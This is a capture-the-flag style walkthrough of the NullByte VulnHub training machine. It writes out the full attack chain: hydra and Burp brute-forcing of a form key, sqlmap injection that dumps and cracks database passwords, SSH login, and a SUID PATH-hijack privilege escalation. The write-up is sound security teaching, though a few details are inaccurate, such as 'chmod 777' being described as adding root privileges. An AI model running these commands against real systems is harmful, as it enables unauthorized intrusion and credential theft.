# VulnHub Walkthrough: 🟢 NullByte

Nullbyte Walkthrough

### Details

* Name: Nullbyte ([VulnHub](https://www.vulnhub.com/entry/nullbyte-1,126/))
* Goal/Objective: Get */root/proof.txt*

### Scanning

Begin by using *netdiscover* to scan for computers/devices on the network:
```bash
sudo netdiscover
```

This returns the IP address of the target machine: ***192.168.132.88***. From there do a intial nmap scan on the network:
```bash
nmap -A -p0-65535 192.168.132.88
```

Ports found open:     
- 80/tcp - HTTP 
- 111/tcp - RPCBIND
- 777/tcp - SSH
- 60316/tcp

Two services that stand out are HTTP & SSH. Note that SSH (port 22) is being forwarded to port 777 (keep in mind for later).

### Website Exploring

I then proceeded to visit the website (http://192.168.132.88:80) to some investigating. The source code for the website did not display anything promising as it only contains a image & some text.

However, I decided to check the image using exiftool to see if there was anything hidden within the metadata:
```bash
exiftool main.gif
```
Looking through the output, I was able to see that there was a section labeled "comments" that contained something that could be useful: *P-): kzMb5nVYJw*


While all this was being done, I did my normal routine of website scanning to help look for extra directories, etc:
```bash
# nikto scan
nikto -h http://192.168.132.88

# gobuster
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -t 20 -u http://192.168.132.88/

# dirb
dirb 192.168.132.88
```
The most important directories that were returned were */uploads* and ***/phpmyadmin/***

### 'Key' cracking

Remember that string that was returned by exiftool? The one labeled as a comment? "P-): kzMb5nVYJw". Yeah we're going to need that. If you remove the first couple of characters up until the space, you're left with "kzMb5nVYJw". This ends up being a directory within the website, http://192.168.132.88/kzMb5nVYJw.

On this page we see a very simple page that contains a textbox titled "Key". However the issue is.. we don't have a key yet.

There are two ways to approach cracking this "Key", using Hydra or Burpsuite. I will show you both.

### Hydra

If you open up the developer tools and go to the "Network" tab, and reload the website. You notice there is a POST request being made. If you click on it and expand the "Request" tab, you see that it is a value *key* is being used as form data. With all this in mind, we can use it to construct a hydra command to help us guess the value of "key".
```bash
hydra -l none -P /usr/share/wordlists/rockyou.txt 192.168.132.88 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^:invalid key"
```
A quick breakdown of the command we're using:
* -l: username (none)
* -P: "password" wordlist
* http-post-form: Recall it is a POST call being made using the form
* "/kzMb5nVYJw/index.php:key=^PASS^:invalid key": We encode the *key* to be url encoded so that it can be passed as an argument, then we use '^' to surround the value that we want hydra to brute form, the password aka the "key"

The hydra command is able to find the password/key: elite

### Burpsuite

We will use burpsuite to also brute-force the value of "key".

Start off by opening Burpsuite and selecting the proxy tab. Then click on "open browser" and visit the page that needs the key, http://192.168.132.88/kzMb5nVYJw. Next click on "interceptor on", then on the website type in anything into the textbox and press enter. 

Then once the data is returned/shown on burpsuite, next to the "intercept is on" button, click on "Action" button and select "Send to Intruder". This will send the information over to the Intruder tab.
Switch to the Intruder tab, and at the bottom of the page, highlight the section of the string after the "=" and click on button on the right "Add". Once this is done, you should be able to switch tabs from "Positions" over to the "Payloads" tab. From here the only thing you need to do is on the "Payload setting", click on "Load" and go to "/usr/share/wordlists" to select the wordlist you would like to use. Once you have done this, you may press the orange button on the top right, "Start attack".

## SQL

Now that we have the key, we can use it on the page. We are now greeted with a page that seems to allow us to search for usernames.

Leaving the text-box empty and pressing enter returns a couple of entries from what appears to be a employee database. 

Since this seems to use mysql, let's try using *sqlmap* to explore the database.
```bash
sqlmap -u "http://192.168.132.88/kzMb5nVYJw/420search.php?usrtosearch=" --dbs
```
We see that sqlmap returns 5 databases. The two that we will explore are 'mysql' and 'seth'.

If you are not familiar with SQL, recall: A database contains tables. A table can be pictured as an excel file, where there are rows and columns of information.

### 'mysql' table

Let's first explore the *mysql* database
```bash
# Check what databases are available
sqlmap -u "http://192.168.132.88/kzMb5nVYJw/420search.php?usrtosearch=" --dbs

# Check what tables are in the 'mysql' database
sqlmap -u "http://192.168.132.88/kzMb5nVYJw/420search.php?usrtosearch=" -D mysql --tables

# Check what columns are in the 'user' table (from the 'mysql database')
sqlmap -u "http://192.168.132.88/kzMb5nVYJw/420search.php?usrtosearch=" -D mysql -T user --columns

# Display User + Password from the 'user' table (from the 'mysql' database)
sqlmap -u "http://192.168.132.88/kzMb5nVYJw/420search.php?usrtosearch=" -D mysql -T user -C User,Password --dump
# Note that the command above will ask if you would like sqlmap to try and crack the passwords via a dictionary-based attack - select 'Y', then press enter to use the default password list.
```
sqlmap returns:
* User: ***root*** | Password: ***sunnyvale***
* User: ***phpmyadmin*** | ***sunnyvale***

### 'seth' table

Next, let's explore the *seth* database
```bash
# Check what tables are in the 'seth' database
sqlmap -u "http://192.168.132.88/kzMb5nVYJw/420search.php?usrtosearch=" -D seth --tables

# Check what columns are in the 'users' table (from the 'seth database')
sqlmap -u "http://192.168.132.88/kzMb5nVYJw/420search.php?usrtosearch=" -D seth -T users --columns

# Display user + pass from the 'users' table (from the 'seth' database)
sqlmap -u "http://192.168.132.88/kzMb5nVYJw/420search.php?usrtosearch=" -D seth -T users -C user,pass --dump
```
sqlmap returns:
* user: ***ramses*** | pass: ***YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE1***
* You can use a website to decrypt this md5 password twice to get the password: ***omega***

## SSH

One thing to quickly notice is that we now have the credentials for the */phpmyadmin/* page (root/sunnyvale). However, I wasn't able to find anything important here.

So instead, let's try and use the credentials that we found from the 'seth' database to try and login via SSH:
```bash
# Notice we're using port 777
ssh ramses@192.168.132.88 -p 777
```

## Priviledge Escalation

Now that we're in, we need to find a way to get root user.

Check to see if anything is out of the ordinary:
```bash
find / -perm -u=s -type f 2>/dev/null
```

Notice that there is something within the www directory called 'procwatch'. If we try to run it, the output looks similar to a cron job.
```bash
/var/www/backup/procwatch
```

It seems that it is attempting to deploy ps, but unable to do so. Go to the directory and create a script that will launch a bash shell.
```bash
# Go to correct directory
cd /var/www/backups

# Create bash script and title it ps
echo "/bin/bash" > ps

# Add root privileges to the file
chmod 777 ps
```


Now, let's check if this is just a script to run the *ps* command:
```bash
# env = list all environment variables | grep PATH = return line containing PATH
env | grep PATH

# Alternatively you can do
echo $PATH
```

Update the PATH for environment variables:
```bash
# Essentially what this command does is add "." + $PATH
export PATH=.:$PATH
```

Finally run `./procwatch`
